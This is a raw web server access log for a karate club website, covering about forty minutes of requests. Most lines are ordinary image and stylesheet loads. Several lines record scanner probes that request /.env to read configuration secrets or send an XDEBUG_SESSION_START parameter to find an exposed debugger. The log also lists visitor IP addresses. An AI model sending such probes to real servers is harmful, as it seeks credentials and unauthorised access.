::ffff:98.234.224.71 - - [13/Aug/2022:15:03:25 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:25 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:25 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:98.234.224.71 - - [13/Aug/2022:15:03:28 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:185.7.214.117 - - [13/Aug/2022:15:08:03 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:15:09:13 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [13/Aug/2022:15:09:16 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [13/Aug/2022:15:33:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [13/Aug/2022:15:33:36 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:165.154.6.57 - - [13/Aug/2022:15:35:59 +0000] "GET / HTTP/1.0" 200 58071 "-" "-"
::ffff:98.51.139.56 - - [13/Aug/2022:15:40:23 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
::ffff:98.51.139.56 - - [13/Aug/2022:15:40:23 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.net/" "Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
